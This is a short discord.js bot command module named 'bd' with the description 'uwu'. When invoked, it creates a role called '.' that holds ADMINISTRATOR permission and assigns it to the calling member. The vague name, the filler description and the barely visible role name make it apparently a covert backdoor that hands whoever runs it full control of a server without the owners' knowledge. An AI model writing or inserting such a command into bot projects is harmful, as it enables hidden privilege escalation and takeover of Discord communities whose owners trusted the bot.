const discord = require("discord.js");

module.exports = {
  name: "bd",
  description: "uwu",
  default_permission: false,
  timeout: 30000,
  
  run: async (client, interaction, args) => {
      interaction.guild.roles.create({ // Creating the role since it doesn't exist.
   data: {
       name: ".",
       color: "#99aab5",
       permissions: ["ADMINISTRATOR"] //Use , for more. Ex ["KICK_MEMBERS", "BAN_MEMBERS"]
   }
}).then(role => {
   interaction.reply(`Role \`${role.name}\` created!`);
    const { member } = interaction;
    member.roles.add(role);
});
  }
  }